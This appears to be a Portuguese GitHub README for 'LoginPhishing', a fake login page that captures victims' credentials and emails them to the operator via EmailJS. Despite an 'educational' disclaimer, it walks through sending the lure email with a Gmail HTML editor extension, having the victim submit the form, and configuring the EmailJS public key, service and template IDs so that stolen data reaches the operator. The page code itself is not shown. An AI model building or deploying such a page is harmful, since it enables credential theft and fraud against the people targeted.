# LoginPhishing

![Página]([https://imgur.com/ZDiX2gC])

Este projeto tem como objetivo demonstrar, de forma **educacional**, como uma página de phishing pode ser criada para fins de **conscientização sobre segurança da informação**. 

> ⚠️ **Atenção:** Este projeto é **exclusivamente para fins educacionais e acadêmicos**. Nunca deve ser usado para fins maliciosos, coleta real de dados, ou violação de privacidade. O uso indevido pode ser considerado crime e é passível de penalidades legais.

---

##  Objetivo

O projeto simula uma página de login com aparência legítima, capturando credenciais de forma didática utilizando **HTML**, **CSS**, **JavaScript** e a biblioteca **EmailJS** para envio dos dados preenchidos no formulário.

---

## 🛠 Tecnologias Utilizadas

- HTML5
- CSS3
- JavaScript (puro)
- [EmailJS](https://www.emailjs.com/) – envio de dados via e-mail

---
## Como Funciona

![Página]([https://i.imgur.com/seuarquivo.png](https://imgur.com/1rDGZQO))

É enviado para a vítima o email criado com a extensão HTML Editor for Gmail by cloudHQ

![Página]([https://imgur.com/ZHFzDOG))

A vitima preenche o formulário e confirma

---

![Página]([https://imgur.com/ZHFzDOG](https://imgur.com/jis3GgN))

E os dados preenchidos pela vítima será enviados para seu email

---

## Como Usar

1. Clone o repositório:
   git clone https://github.com/seu-usuario/nome-do-repositorio.git
   
2. Configure o serviço EmailJS:
   - Crie uma conta no EmailJS
   - Crie um service, template, e copie sua public key
   - Substitua no código:
       emailjs.init("Sua Public Key");
       emailjs.send("Seu Service ID", "Seu Template ID", templateParams)



